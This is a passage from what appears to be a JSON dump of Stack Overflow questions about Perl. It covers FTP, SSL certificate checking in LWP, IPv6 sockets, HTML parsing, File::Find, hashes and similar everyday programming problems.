$ftp-&gt;message;\n\n# re-use attempt\n$ftp-&gt;login( $username, $password ) or die \"cannot login: \", $ftp-&gt;message;\n\n# never gets here since re-use attempt fails\nprint \"done!\\n\";\n</code></pre>\n"},{"tags":["python","regex","perl","seek"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":97,"score":2,"question_id":12610830,"title":"seek to regex in a large file using python","body":"<p>I am trying to seek to a token ':path,' in a file, then read all the following (arbitrary digit count) numbers as a number (so for ':path,123' I seek to the , in file then read the integer 123).  Then read the chars between the current seek position and pos+123 (store them in a list or whatever).  Then seek until the next match for ':path,' and repeat the process.</p>\n\n<p>I would like a function a bit like:</p>\n\n<pre>\ndef fregseek(FILE, current_seek, /regex/):\n\n.\n.\n  value_found = ?  # result of reading next N chars after :path,[0-9]+\n.\n.\n  return next_start_seek, value_found\n</pre>\n\n<p>There may be any number of matches for ':path,' in a line, and that string may occur within the number of chars specified after ','.  I have written a messy bunch of rubbish which reads in each line, then for each line chomps of the first N chars indicated by the match, then continues processing the string until it is all eaten up. Then reads the next string and so on.</p>\n\n<p>This is horrible, I do not want to have to slurp off all the lines from a potentially huge file when all I really need to do is seek (especially since a newline is irrelevant, so having an extra processing step just because lines are easy to pull from files is ridiculous).</p>\n\n<p>So, there it is, that is my problem that I would like to solve.  I need to seek to a match, read a value, continue from the end of that value looking for the next match and so on until the file is exhausted.</p>\n\n<p>If anybody can help me with this I will be happy to hear from them :)</p>\n\n<p>I would like to avoid non-standard libraries if possible, I would also like the shortest code but this is the least of my concerns (speed and memory consumption are the important factors, but I don't want 50 loc extra just to bootstrap some library with a small funciton in it I could just rip out if only I knew what it was).</p>\n\n<p>I would prefer python code, however, if perl beats python in this regard I will use perl instead, I am also open to clever sed/awk/bash scripts etc as long as they are not horribly slower.</p>\n\n<p>Thanks very much in advance.</p>\n"},{"tags":["perl","ssl","https","lwp"],"answer_count":6,"favorite_count":9,"up_vote_count":17,"down_vote_count":0,"view_count":20747,"score":17,"question_id":74358,"title":"How can I get LWP to validate SSL server certificates?","body":"<p>How can I get <a href=\"http://search.cpan.org/perldoc?LWP\">LWP</a> to verify that the certificate of the server I'm connecting to is signed by a trusted authority and issued to the correct host?  As far as I can tell, it doesn't even check that the certificate claims to be for the hostname I'm connecting to.  That seems like a major security hole (especially with the recent DNS vulnerabilities).</p>\n\n<p><strong>Update:</strong>  It turns out what I really wanted was <code>HTTPS_CA_DIR</code>, because I don't have a ca-bundle.crt.  But <code>HTTPS_CA_DIR=/usr/share/ca-certificates/</code> did the trick.  I'm marking the answer as accepted anyway, because it was close enough.</p>\n\n<p><strong>Update 2:</strong> It turns out that <code>HTTPS_CA_DIR</code> and <code>HTTPS_CA_FILE</code> only apply if you're using Net::SSL as the underlying SSL library.  But LWP also works with IO::Socket::SSL, which will ignore those environment variables and happily talk to any server, no matter what certificate it presents.  Is there a more general solution?</p>\n\n<p><strong>Update 3:</strong> Unfortunately, the solution still isn't complete.  Neither Net::SSL nor IO::Socket::SSL is checking the host name against the certificate.  This means that someone can get a legitimate certificate for some domain, and then impersonate any other domain without LWP complaining.</p>\n\n<p><strong>Update 4:</strong> <a href=\"http://search.cpan.org/dist/libwww-perl/\">LWP 6.00</a> finally solves the problem.  See <a href=\"http://stackoverflow.com/questions/74358/how-can-i-get-lwp-to-validate-ssl-server-certificates#5329129\">my answer</a> for details.</p>\n"},{"tags":["regex","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":63,"score":2,"question_id":12627675,"title":"Perl:Regex substitution","body":"<p>I want to write a regex to substitute remove white spaces within my string as follows:</p>\n\n<p>String : <code>user1: group user2 :group2 user3 : group3</code> \nto</p>\n\n<pre><code>user1:group user2:group2 user3:group3\n</code></pre>\n\n<p>What I tried so far is:</p>\n\n<pre><code>$argument =~ s/\\s+\\:/\\:/g;\n</code></pre>\n"},{"tags":["perl","sockets","ipv6"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":50,"score":2,"question_id":12622387,"title":"What is best way to know if OS/platform supports IPv6 socket to listen IPv4 as well in Perl?","body":"<p>(Please close this thread if duplicate, I tried hard, but couldn't find any matching question)</p>\n\n<p>It seems some OS/platforms listen for both IPv6 and IPv4 (tcp) connections when bound to IPv6 widcard address, while some listen for only IPv6, as mentioned in:</p>\n\n<p><a href=\"http://search.cpan.org/~pevans/IO-Socket-IP-0.17/lib/IO/Socket/IP.pm\" rel=\"nofollow\">for the V6Only argument</a></p>\n\n<p>with the following lines: </p>\n\n<blockquote>\n  <p>If your platform does not support disabling this option but you still want to listen for both AF_INET and AF_INET6 connections you will have to create two listening sockets, one bound to each protocol</p>\n</blockquote>\n\n<p>And in the section \"<a href=\"http://docs.oracle.com/javase/1.5.0/docs/guide/net/ipv6_guide/index.html\" rel=\"nofollow\">How IPv6 Works on a Java Platform</a>\"</p>\n\n<p>And as per correct answer <a href=\"http://stackoverflow.com/questions/1618240/how-to-support-both-ipv4-and-ipv6-connections\">in this SO question</a></p>\n\n<p>Now I want to write some Perl code which can determine if the underlying OS/platform listens for both IPv6 and IPv4 (if bound to IPv6), if yes, I'll bind to IPv6 only, if no I'll create 2 sockets (1 for IPv4 and another for IPv6).</p>\n\n<p>I wonder what could be the best way for this?</p>\n\n<p>As mentioned in :\n<a href=\"http://search.cpan.org/~pevans/IO-Socket-IP-0.17/lib/IO/Socket/IP.pm\" rel=\"nofollow\">http://search.cpan.org/~pevans/IO-Socket-IP-0.17/lib/IO/Socket/IP.pm</a>\nI could use </p>\n\n<pre><code>if( IO::Socket::IP-&gt;CAN_DISABLE_V6ONLY ) {\n    ...\n}\nelse {\n    ...\n}\n</code></pre>\n\n<p>But, I am not sure if it will tell me exactly </p>\n\n<blockquote>\n  <p>if the underlying OS/platform listens  for both IPv6 and IPv4 (if bound to IPv6)</p>\n</blockquote>\n\n<p>Or it will just tells that the </p>\n\n<blockquote>\n  <p>IPV6_V6ONLY socket option cannot be disabled</p>\n</blockquote>\n"},{"tags":["perl","html-tree"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12619981,"title":"HTML::TreeBuilder->new_from_url() in perl not working","body":"<p>Using HTML::TreeBuilder->new_from_url() want to go to a website say <a href=\"https://abc.com/index.html\" rel=\"nofollow\">https://abc.com/index.html</a> and want to display some values from that html page.</p>\n\n<p><a href=\"https://abc.com/index.html\" rel=\"nofollow\">https://abc.com/index.html</a>  asks for user authentication(test/test123 are username and password). I have used below code: File name: finaldisplay.pl</p>\n\n<pre><code>  #!/usr/bin/perl\n\n   use HTML::TreeBuilder;\n   use HTML::Entities;\n\n\n   my $url = \"http://test:test123@abc.com:8080/index.html\";\n   my $tree = HTML::TreeBuilder-&gt;new_from_url($url);\n\n   $tree-&gt;elementify;\n\n   for my $post( $tree-&gt;look_down( _tag =&gt; q{tr}, 'class' =&gt; 'row-odd'  ) ) {\n\nmy $disk_value;\nmy $name = $post-&gt;look_down( _tag =&gt; q{td}, 'class' =&gt; 'stats_left');\n    my $data = $name-&gt;as_trimmed_text;\n\n\n if($data =~ /Home Directory/){\n$disk_value =   $post-&gt;look_down( _tag =&gt; q{td}, 'class' =&gt; 'stats_right' )-&gt;as_trimmed_text;\nprint STDERR \"$data : $disk_value\\n\";\n}\nelsif($data =~ /Disk Space Usage/){\n$disk_value = $post-&gt;look_down( _tag =&gt; q{td}, 'class' =&gt; 'stats_right' );\n$disk_value = ($disk_value-&gt;content_list)[0];\n\n$disk_value  = encode_entities($disk_value);\n\n print STDERR \"$data : $disk_value\\n\";\n}\n\n}\n\nfor my $post( $tree-&gt;look_down( _tag =&gt; q{tr}, 'class' =&gt; 'row-even'  ) ) {\n\nmy ($disk_value, $disk);\n\nmy $name = $post-&gt;look_down( _tag =&gt; q{td}, 'class' =&gt; 'stats_left');\n     my $data = $name-&gt;as_trimmed_text;\n\n    if($data =~ /Main Domain/){\n$disk = $post-&gt;look_down( _tag =&gt; q{td}, 'class' =&gt; 'stats_right' );\n$disk_value = $post-&gt;look_down( _tag =&gt; q{b})-&gt;as_trimmed_text;\nprint STDERR \"$data : $disk_value\\n\";\n} \n\n }\n</code></pre>\n\n<p>When I am running the file from command line getting error \"Can't locate auto/HTML/TreeBuilder/new_from_ur.al in @INC (@INC contains: C:/Per\nl/lib C:/Perl/site/lib .) at finaldisplay.pl line 8\"</p>\n"},{"tags":["javascript","perl","csv","download"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":85,"score":0,"question_id":12377293,"title":"PERL - Downloading CSV files incompletely","body":"<p>I have a server side script which accepts form input and logs in to Testopia (Bugzilla plug-in) and gets a CSV describing a certain test run using:</p>\n\n<p><code>Mech-&gt;get(\"&lt;...&gt;/tr_list_caseruns.cgi?ctype=csv&amp;run_id=xxxxx\", \":content-file\" =&gt; \"result.csv\");</code></p>\n\n<p>The browser link is some javascript that exports the CSV by setting window.location to this url. Manually clicking the link in the browser will download the full CSV, however getting the link using mechanize will only download the first 25 records (typing the url into browser prompts download and only gets the first 25 as well). Link is of the form:</p>\n\n<pre><code>text: 'Export Results to CSV',\nicon: 'extensions/Testopia/img/csv.png',\niconCls: 'img_button_16x',\nhandler: function(){\nwindow.location = 'tr_list_caseruns.cgi?ctype=csv&amp;run_id=' + run.run_id;\n</code></pre>\n\n<p>(In an Ext.menu.Menu)</p>\n\n<p>Is there a good way to do this? Even the difference between typing the url and clicking the link would be useful. Thanks. </p>\n\n<p>-Kevin</p>\n"},{"tags":["perl","https","proxy","lwp","lwp-useragent"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":371,"score":2,"question_id":12116244,"title":"HTTPS Proxy and LWP::UserAgent","body":"<p>I have read a number of threads on a number of sites and am still unable to make this work. </p>\n\n<p>I have a client machine (OSX) with OpenSSL 0.9.8r running perl 5.12.4, with LWP 6.0.4, updated Crypt::SSLeay, Net::SSL etc. I am trying to connect to an HTTPS site (https://github.com in the example) via a WinGate proxy that I have running on a Windows VM. Note that my actual application is attaching to an SSL webservice that I have no control over.</p>\n\n<p>From Firefox, pointed to the proxy everything is copacetic. The page loads successfully and I see the connections in the Proxy software Activity monitor. I'll be darned if I can make it work in Perl though. I've started with the code from this Stack Overflow Question : <a href=\"http://stackoverflow.com/questions/8026524\">How do I force LWP to use Crypt::SSLeay for HTTPS requests?</a> And added some debugging and additional output. Here's were I stand now:</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\nuse Net::SSL (); # From Crypt-SSLeay\n\nBEGIN {\n  $Net::HTTPS::HTTPS_SSL_SOCKET_CLASS = \"Net::SSL\"; # Force use of Net::SSL\n  $ENV{HTTPS_PROXY} = 'https://192.168.1.11:80';\n#  $ENV{PERL_LWP_SSL_VERIFY_HOSTNAME} = 0;\n  $ENV{HTTPS_DEBUG} = 1;  #Add debug output\n}\n\nuse LWP::UserAgent;\nmy $ua = LWP::UserAgent-&gt;new();\nmy $req = HTTP::Request-&gt;new('GET','https://github.com/');\nmy $response = $ua-&gt;request($req);\n\nprint \"--\\n\";\nprint \"$_\\n\" for grep { $_ =~ /SSL/ } keys %INC;\nprint \"--\\n\";\n\nif ($response-&gt;is_success) {\n     print $response-&gt;decoded_content;  # or whatever\n     exit(0);\n}\nelse {\n print \"\\nFail:\\n\";\n     print $response-&gt;status_line .\"\\n\";\n     exit(1);\n}\n</code></pre>\n\n<p>Here's the output from this code:</p>\n\n<pre><code>--\nCrypt/SSLeay.pm\nCrypt/SSLeay/X509.pm\nNet/SSL.pm\n--\n\nFail:\n500 Can't connect to github.com:443 (Crypt-SSLeay can't verify hostnames)\n</code></pre>\n\n<p>If I then uncomment <code>$ENV{PERL_LWP_SSL_VERIFY_HOSTNAME} = 0;</code>, I do see a single connect to github.com:443 on the proxy and then nothing. <em>(Note it works great from a web browser through the proxy)</em>. After much hanging I get the following output from the script:</p>\n\n<pre><code>SSL_connect:before/connect initialization\nSSL_connect:SSLv2/v3 write client hello A\nSSL_connect:before/connect initialization\nSSL_connect:SSLv3 write client hello A\nSSL_connect:failed in SSLv3 read server hello A\nSSL_connect:before/connect initialization\nSSL_connect:SSLv2 write client hello A\nSSL_connect:failed in SSLv2 read server hello A\n--\nCrypt/SSLeay.pm\nCrypt/SSLeay/X509.pm\nNet/SSL.pm\nCrypt/SSLeay/CTX.pm\nCrypt/SSLeay/MainContext.pm\n--\n\nFail:\n500 SSL negotiation failed: \n</code></pre>\n\n<p>If anyone can provide some direction here I would greatly appreciate it!</p>\n"},{"tags":["perl","scope"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":93,"score":4,"question_id":12622586,"title":"How to limit module scope to a subroutine?","body":"<p>if I run the next script:</p>\n\n<pre><code>use strict;\nuse warnings;\n\nsub load {\n    use File::Path qw (make_path);\n}\n\nload();\nmake_path('1/2/3/4');\n\nexit 0;\n</code></pre>\n\n<p>It works perfectly. I would like to limit the scope of a loaded module to the subroutine so that I cannot use subroutines declared in the module outside the subroutine which loads it. Is it possible?</p>\n"},{"tags":["perl","memory-management","perl-module","perl-data-structures"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":101,"score":2,"question_id":12619797,"title":"Memory Management in perl","body":"<p>I have facing a weird issue of handling  memory in perl.\nI am working in a perl application which uses pretty big hash-structures. I am assigning the has ref to and fro objects. But at the end it seems even if I am deallocating the object and the hash, the memory usage is remaining same.</p>\n\n<p>Here is a sample of the problem:</p>\n\n<pre><code> my $hash = {};\n .............\n this ds gets populated with a lot of data ...\n .......\n {\n      my $obj = new Class(\"data\"=&gt;$hash);\n .......\n .......\n ......\n\n }\n\n #even undefing the $hash\n undef $hash;\n\n # I can expect some improvement in Memory Utilization, but its not happening\n</code></pre>\n\n<p>I think I am doing some very basic mistakes. Can any one suggest?</p>\n"},{"tags":["perl","debugging","vim","ubuntu"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":73,"score":1,"question_id":12620074,"title":"\"==!!! Resulted fork bomb\" error using Perl VimDebug","body":"<p>I using this VimDebug: <a href=\"http://www.vim.org/scripts/script.php?script_id=663\" rel=\"nofollow\">http://www.vim.org/scripts/script.php?script_id=663</a><br>\nAnd after I press F12 for start debug session I have long stack trace with error like:  </p>\n\n<pre><code>==!!! Resulted for bomb which slowly wil ...\n</code></pre>\n\n<p>And CPU go to 100%...  </p>\n\n<p>Some one know what it may be?<br>\nThank you for ahead.</p>\n"},{"tags":["perl","file-find"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":88,"score":2,"question_id":12620423,"title":"Is there a cleaner way for File::Find to return a list of wanted files?","body":"<p>I find the design choice behind <a href=\"https://metacpan.org/module/File%3a%3aFind\" rel=\"nofollow\"><code>File::Find::find</code></a> a little surprising. The examples I've come across all show <code>find</code> used in void context.</p>\n\n<p>The <a href=\"https://metacpan.org/module/File%3a%3aFind#The-wanted-function\" rel=\"nofollow\">documentation</a> also clarifies that the <code>\\&amp;wanted</code> coderef in <code>find( \\&amp;wanted, @dirs )</code> is not meant to be a filter (emphasis my own):</p>\n\n<blockquote>\n  <p>The <code>wanted()</code> function does whatever verifications you want on <strong><em>each</em></strong>\n  file and directory. Note that despite its name, the <code>wanted()</code>\n  function is a generic callback function, and does <strong><em>not</em></strong> tell\n  <code>File::Find</code> if a file is \"wanted\" or not. In fact, its return value\n  is ignored.</p>\n</blockquote>\n\n<hr>\n\n<p>But what if I do want to use it as a filter in a manner similar to <a href=\"http://perldoc.perl.org/functions/grep.html\" rel=\"nofollow\"><code>grep</code></a>? I'm curious to know if there's another way to write the following:</p>\n\n<pre><code>use strict;\nuse warnings;\nuse feature 'say';\n\nuse File::Find;\n\nmy $wanted = qr/^\\d{2}_/;  # e.g.\n\nmy @wanted;\nfind( sub { -f &amp;&amp; /$wanted/ &amp;&amp; push @wanted, $_ }, '.' );\n\n# I wish my @wanted = find( ... ); worked\n\nsay for @wanted;\n</code></pre>\n"},{"tags":["windows","perl","sockets","ipv6"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":84,"score":0,"question_id":12086192,"title":"perl Socket6 binding to only one wildcard address","body":"<p>I have following program in perl which is supposed to listen on IPv6 address, and by theory should serve to both IPv4 (through IPv4 mapped IPv6 address) and IPv6 clients on a dual stack box.</p>\n\n<pre><code>use Socket;\nuse Socket6;\n\n@res = getaddrinfo('', 8086, AF_UNSPEC, SOCK_STREAM,0, AI_PASSIVE);\nmy @ipv6Result;\n\nwhile(scalar(@res)&gt;=5){\n    my @currentResult = @res;\n    ($family, $socktype, $proto, $saddr, $canonname, @res) = @res;\n    if($family == AF_INET6){\n        @ipv6Result = @currentResult;\n    }\n} \n\nif(@ipv6Result){\n    ($family, $socktype, $proto, $saddr, $canonname) = @ipv6Result;\n}\n\nsocket(Socket_Handle, $family, $socktype,$proto) || next;\nbind(Socket_Handle,$saddr  )    || die \"bind: $!\";\nlisten(Socket_Handle, 1)                       || die \"listen: $!\";\n$paddr = accept(Client,Socket_Handle) || die \"accept: $!\";\n</code></pre>\n\n<p>After running this the netstat gave following observation:</p>\n\n<pre><code>c:\\Perl\\bin&gt;netstat -nao | findstr 8086\nTCP    [::]:8086              [::]:0                 LISTENING       2892\n</code></pre>\n\n<p>It seems, it is listening on only IPv6 wildcard address (::) and not on IPv4 wildcard address (0.0.0.0). I was not able to connect this server process from an IPv4 client, but was able to connect through an IPv6 client.</p>\n\n<p>I tried a similar server program in java as follows (on the same setup):</p>\n\n<pre><code>import java.net.ServerSocket;\npublic class CodeTCPServer {\n    public static void main(String[] args) throws Exception{\n        new ServerSocket(8086).accept();\n    }\n}\n</code></pre>\n\n<p>The netstat output for this was as follows:</p>\n\n<pre><code>C:\\Users\\Administrator&gt;netstat -nao | findstr 8086\nTCP    0.0.0.0:8086           0.0.0.0:0              LISTENING       3820\nTCP    [::]:8086              [::]:0                 LISTENING       3820\n</code></pre>\n\n<p>Seems to listen on both IPv6 and IPv4, and I am also able to connect it from IPv4 and IPv6 clients.</p>\n\n<p>If I run the same perl program on a linux box it works fine, and I am able to connect to it through IPv4 and IPv6 clients.</p>\n\n<p>I wonder, if something on windows is stopping the perl program from listening on both IPv4 and IPv6 (but then it should have stopped the java program as well for the same reason). If some problem with the program logic it shouldn't have worked on linux as well.</p>\n\n<p>(I am using Socket6 for now, as I couldn't use perl's inbuilt support for IPv6 somehow on windows, I am in communication with the authors to get it worked on my setup)</p>\n\n<p>UPDATE:</p>\n\n<p>I just tried following:</p>\n\n<pre><code>setsockopt (Socket_Handle, IPPROTO_IPV6, IPV6_V6ONLY, 0 ) or print(\"\\nFailed to set IPV6_V6ONLY $! \");\n</code></pre>\n\n<p>in anticipation that the socket option has default value 1 (for this platform), and I have to manually override it, but alas! I got following error:</p>\n\n<p>Your vendor has not defined Socket macro IPV6_V6ONLY, used at c:\\socket6\\Socket6Server.pl line 66</p>\n\n<p>Now I wonder what does 'vendor' mean, is it Socket6 module / perl vendor or OS vendor ?</p>\n\n<p>UPDATE2</p>\n\n<p>I think the answer is given in <a href=\"http://search.cpan.org/~pevans/IO-Socket-IP-0.17/lib/IO/Socket/IP.pm\" rel=\"nofollow\">http://search.cpan.org/~pevans/IO-Socket-IP-0.17/lib/IO/Socket/IP.pm</a> (for the V6Only argument)</p>\n\n<p>with following lines:\nIf your platform does not support disabling this option but you still want to listen for both AF_INET and AF_INET6 connections you will have to create two listening sockets, one bound to each protocol.</p>\n\n<p>And this worked for me! But then I need to check if the platform supports V6Only disabling\n(protocol aware code in my program :( ), when compared to Java, Java does it automatically for me (checking and creating 2 sockets).</p>\n"},{"tags":["php","perl","phpunit"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":12606022,"title":"phpunit: Are there functions similar to perl's Test::More::note() and Test::More::diag() functions?","body":"<p>I am new to Phpunit, and by coincidence (as of Sept, 2012) I have installed the brand-new phpunit 3.7.0  (actually it's displayed as 3.7.1 because my phpunit installation is a git checkout)</p>\n\n<p>What I want is an test-aware \"echo\" keyword or printf Function that does the same in a phpunit test class as does the <code>diag()</code> function or the <code>note()</code> function from perl's <a href=\"http://perldoc.perl.org/Test/More.html\" rel=\"nofollow\">Test::More</a> module.</p>\n\n<blockquote>\n  <p>diag</p>\n\n<pre><code>diag(@diagnostic_message);\n</code></pre>\n  \n  <p>Prints a diagnostic message which is guaranteed not to interfere with\n  test output. Like print @diagnostic_message is simply concatenated\n  together.</p>\n  \n  <p>note</p>\n\n<pre><code>    note(@diagnostic_message);\n</code></pre>\n  \n  <p>Like diag(), except the message will not be seen when the test is run in a harness. \n     It will only be visible in the verbose TAP stream.</p>\n  \n  <p>Handy for putting in notes which might be useful for debugging, but don't indicate a problem.</p>\n</blockquote>\n\n<p>I haven't yet discovered the way PHPUnit does this.</p>\n\n<pre><code>    Please note that PHPUnit swallows all output that is emitted during the execution of a test.\n In strict mode, a test that emits output will fail.\n</code></pre>\n\n<p>There are <a href=\"http://stackoverflow.com/questions/7493102/phpunit-cli-output-during-test-debugging-possible\">workarounds</a>. </p>\n"},{"tags":["perl","formatting"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":12608532,"title":"Perl - Formatting the output data","body":"<p>I have data output in the below format.\nI get this output from a command on console.</p>\n\n<pre><code>Number: 9\nstate: Online\nData:             W1F-9YN\nDevice: 41\nNumber: 10\nstate: Online\nInquiry Data:             W1-9YN                   \nDevice: 41\nNumber: 11\nstate: Online\nInquiry Data:             W1-9YN                   \nDevice: N/A\nNumber: 42\nstate: Online\nData:      WD-W WDZ-04J                \n</code></pre>\n\n<p>Â  Â Â \nBut, now I want to change it to output in a table format.\nLike as shown below</p>\n\n<pre><code>Device   number  state    data\n41        10     online   WY1-996\n42        12     offline  WY2-996\n.          .       .        .\n.          .       .        .\n.          .       .        .\n</code></pre>\n\n<p>I tried doing with code given below, but I am not able to arrange in right format and some time all data shows up in a single column. Could anyone help me out ?</p>\n\n<pre><code>open WDLIST, \"Command\";\n\nwhile (&lt;WDLIST&gt;) {\n\n    if (m/Device\\s*:\\s*(\\d+)/) {\n\n        $enDevice = $1;\n        print \"$enDevice\";\n    }\n\n    if (m/Number\\s*:\\s*(\\d+)/) {\n\n        $umber = $1;\n        print \"$Number\";\n        chomp;\n    }\n\n    if (m/state\\s*:\\s*(w+)/) {\n\n        $State = $1;\n        print\"$State\";\n    }\n\n    if (m/Data\\s*:\\s*(w+)(d+)(\\-)(\\s)/) {\n\n        $Data = $1;\n        print\"$Data\";\n    }\n}\n</code></pre>\n\n<p>Thank You!</p>\n"},{"tags":["perl","redirect","io","stream","stdout"],"answer_count":4,"favorite_count":1,"up_vote_count":9,"down_vote_count":0,"view_count":583,"score":9,"question_id":10519779,"title":"Perl: Redirect STDOUT to two files","body":"<p>How can I redirect the <code>STDOUT</code> stream to two files (duplicates) within my Perl script? Currently I am just streaming into a single log file: </p>\n\n<pre><code>open(STDOUT, \"&gt;$out_file\") or die \"Can't open $out_file: $!\\n\";\n</code></pre>\n\n<p>What do I have to change? Thx.</p>\n"},{"tags":["multithreading","perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":123,"score":0,"question_id":12370935,"title":"How to create threads in Perl?","body":"<p>I have got easy Perl script where I have got a BIG loop and inside this I invoke more or less million times function <code>my_fun()</code>. I would like to create pool of threads which will be dealing with it - max 5 threads in this same time will be invoking this method in loop.</p>\n\n<p>It is really important for me to use the fastest library - It will be really nice to see examples.</p>\n\n<p>My code looks like this:</p>\n\n<pre><code>for (my $i = 0; $i &lt; 1000000 ; $i++) {\n        my_fun();\n}\n</code></pre>\n\n<p>Thank you in advance </p>\n"},{"tags":["perl","chomp"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":97,"score":-3,"question_id":12619545,"title":"When to use chomp?","body":"<p>What is the purpose and advantages of chomp function.\nWhat all can it do? \nDoes using chomp creates any problems? \nor using chomp after file opening is necessary?</p>\n"},{"tags":["perl","installation","gentoo"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12615013,"title":"Location of perl libraries","body":"<p>First of all, I'm not familiar with Perl and it's practices.</p>\n\n<p>I'm trying to develop an <a href=\"https://en.wikipedia.org/wiki/Ebuild\" rel=\"nofollow\">ebuild</a> that installs a Perl application. However I don't know where to put the library files of the application.</p>\n\n<p>The application's directory structure is</p>\n\n<pre><code>binary\nshare/app/*.pl\nshare/app/icons/*.png\n</code></pre>\n\n<p><code>binary</code> being the Perl executable.</p>\n\n<p>In the binary I see lines like <code>require 'someLibrary.pl';</code> these refer to the Perl libraries in the <code>share/app/</code> directory. I also notice a <code>use lib \"$BIN/share/app\";</code> line, which tells the binary where to locate the additional libraries I guess.</p>\n\n<p>Now I face the problem how to install the application.</p>\n\n<p><strong>Solution #1:</strong> Install the binary in <code>/usr/bin/</code> and the libraries in <code>/usr/lib/perl5/</code>.</p>\n\n<p><strong>Problem:</strong> Where to put the icons? The icons are referred in the binary and libraries using <code>$Bin/share/app/icons/*.png</code>. This won't work I guess.</p>\n\n<p><strong>Solution #2:</strong> Install everything in <code>/usr/share/app/</code>.</p>\n\n<p><strong>Problem:</strong> Where to put the binary? Create a symlink in <code>/usr/bin/</code> to the binary?</p>\n\n<p><strong>Solution #3:</strong> Patch the Perl files so they look for icons in <code>/usr/share/app/icons</code>, place the binary in <code>/usr/bin/</code> and the libraries in <code>/usr/lib/perl5/</code>.</p>\n\n<p><strong>Problem:</strong> I have to create a patch for the files. This doesn't seem like a good/normal way.</p>\n\n<p>Of course other solutions are more than welcome.</p>\n\n<p><strong>Update:</strong> I've tried solution #2 and as I suspected, when I execute <code>/usr/bin/binary</code> the library path gets turned into <code>/usr/bin/share/app</code>. This of course results in the libraries not being found.</p>\n"},{"tags":["perl","email","header"],"answer_count":4,"favorite_count":1,"up_vote_count":5,"down_vote_count":1,"view_count":1337,"score":4,"question_id":372721,"title":"What is the smallest program possible to parse an email message header?","body":"<p>the homework: <a href=\"http://www.cs.rit.edu/~waw/networks/prob1.082.html\" rel=\"nofollow\">http://www.cs.rit.edu/~waw/networks/prob1.082.html</a></p>\n\n<p>Ok, I am still confused why this question was asked for my data communications and networks class, but here is the question from my homework:</p>\n\n<blockquote>\n  <ol>\n  <li><p>Write a computer program that reads the header on an e-mail message and\n  deletes all lines except those that\n  begin with</p>\n  \n  <p>From:, To:, Subject: and Cc:.</p></li>\n  </ol>\n  \n  <p>CONTEST -- Who can write the shortest\n  program that does this.</p>\n</blockquote>\n\n<p>So after thinking for a bit I decided that the following Perl code was as small as I could do this.</p>\n\n<pre><code>#!/usr/bin/perl\n\nwhile (&lt;&gt;) { print \"$_\" if ($_ =~ m/^(To:|From:|Subject:|Cc:)/); }\n</code></pre>\n\n<p>All this does is act like a filter for which the only output is lines that start with From:, To:, Subject: and Cc: as specified in the question. Since there aren't any specific details I think that the above code works to at least correctly answer the question.</p>\n\n<p>Now, I wonder how small a program could possibly written for this? I can understand if no one wants to post code because they think I will use it for the assignment, but I am more or less looking for suggestions and techniques that could help me write the shortest program possible.</p>\n\n<p>Also, I am quite sure by shortest he is referring to actual code length. He did mention that scripting languages were the way to go so I doubt he is considering something like the overhead involved with an interpreter. This also means that he does not care which language is used.</p>\n\n<p>Thanks for looking!</p>\n\n<p>EDIT: Thanks for the suggestions! I had been reading questions here for quite a while, hopefully in the future I can contribute more. Also, some of the suggestions I trimmed my Perl code down to 55 bytes. I don't think we will need to deal with something like a multi-line header.</p>\n\n<p>BONUS: Who can identify a good reason why this was asked in a class where we are discussing things like packet switching and client/server architectures?</p>\n\n<p>EDIT2: For the record, my professor said that someone did this with something like 55 bytes. The only way I see that as being possible is if he was only asking for a simple implementation like the one above.</p>\n"},{"tags":["perl","hash"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":57,"score":2,"question_id":12619304,"title":"Dereferencing hashes of hashes in Perl","body":"<p>I'm trying to collect the values that I store in a hash of hashes, but I'm kinda confused in how perl does that. So, I create my hash of hashes as follows:</p>\n\n<pre><code> my %hash;\n my @items;\n\n #... some code missing here, generally I'm just populating the @items list \n #with $currentitem items\n\n while (&lt;FILE&gt;) { #read the file\n\n         ($a, $b) = split(/\\s+/,$_,-1);\n         $hash{$currentitem} =&gt; {$a =&gt; $b};\n         print $hash{$currentitem}{$a} . \"\\n\";#this is a test and it works\n}\n</code></pre>\n\n<p>The above code seems to work. Now, to the point: I have an array @items, which keeps the $currentitem values. And I want to do something like this: </p>\n\n<pre><code>@test = keys %hash{ $items[$num] };\n</code></pre>\n\n<p>So that I can get all the key/value pairs for a specific item. I've tried the line of code above, as well as </p>\n\n<pre><code> while ( ($key, $value) = each( $hash{$items[$num]} ) ) {\n\n      print \"$key, $value\\n\";\n }\n</code></pre>\n\n<p>I've even tried to populate  the hash as follows:</p>\n\n<pre><code>$host{ \"$currentcustomer\" }{\"$a\"} =&gt; \"$b\";\n</code></pre>\n\n<p>Which seems to be more correct according to the various online sources I've met. But still, I can't access the data inside that hash... Any ideas?</p>\n"},{"tags":["perl","parameters"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":59,"score":-4,"question_id":12618498,"title":"Can i randomize parameters with Perl","body":"<p>is there a way with Perl to randomize all parameters for example :</p>\n\n<p><a href=\"http://s.example.com/x?list=hahaha&amp;a=&amp;b=&amp;c=&amp;1\" 